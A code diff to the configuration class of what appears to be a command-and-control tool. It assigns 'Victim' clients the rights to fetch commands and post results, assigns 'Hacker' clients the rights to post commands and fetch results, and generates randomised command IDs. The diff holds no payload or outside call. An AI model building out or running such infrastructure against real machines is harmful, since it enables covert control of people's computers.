@@ -72,9 +72,15 @@ class Config:
         # to make the server do the command. privileges will be assigned
         # to each command.
 
-        self.server_cmds = {
-
+        self.server_cmd_privileges = {
+            "verify": ut.ClientType.Victim,
+            "fetch_cmd": ut.ClientType.Victim,
+            "post_res": ut.ClientType.Victim,
+            "post_cmd": ut.ClientType.Hacker,
+            "fetch_res": ut.ClientType.Hacker
         }
+
+        self.server_cmds = {self.get_server_cmd_id(cmd): cmd for cmd in self.server_cmd_privileges}
 
         # ---- Python and response type map
         self.py_res_type_map = {
@@ -90,9 +96,22 @@ class Config:
         # ---- Saving profile changes
         self.commit_profile()
 
-    def get_server_cmd(self, cmd: str):
-        """ Get the server command from the """
-        pass
+    def get_server_cmd_id(self, cmd: str):
+        """ Get the server command from the profiles."""
+        # Let's first check for the server_cmds entry in the profile
+        # and create it if it doesn't exist
+        if (server_cmds := self.query_profile("server_commands")) is None:
+            self.profile["server_commands"], server_cmds = {}, {}
+
+        # Let's now get the cmd from within the server_cmds
+        cmd_id = self.query_profile(cmd, profile=server_cmds)
+
+        if cmd_id is None:
+            # Let's now create the command id and save it in the profiles
+            cmd_id = ut.generate_token()[:8]
+            self.profile["server_commands"][cmd] = cmd_id
+
+        return cmd_id
 
     def get_port_ip(self, profile_field: str, user_option, default):
         """ Get and validate the ip and port range. """
@@ -114,8 +133,9 @@ class Config:
                 # the  field is not found in the profile
                 # so let's set the default to the field
                 field = default
-                # and finally set the field in the profile
-                self.profile["address"][profile_field] = field
+
+        # and finally set the field in the profile
+        self.profile["address"][profile_field] = field
 
         return field
 
@@ -126,13 +146,7 @@ class Config:
         if profile is None:
             profile = self.profile
 
-        try:
-            # Check if the given key exists in the profile file else return None
-            value = profile[key]
-        except KeyError:
-            return None
-
-        return value
+        return profile.get(key, None)
 
     def commit_profile(self):
         """ Save the changes made to `self.profile` """
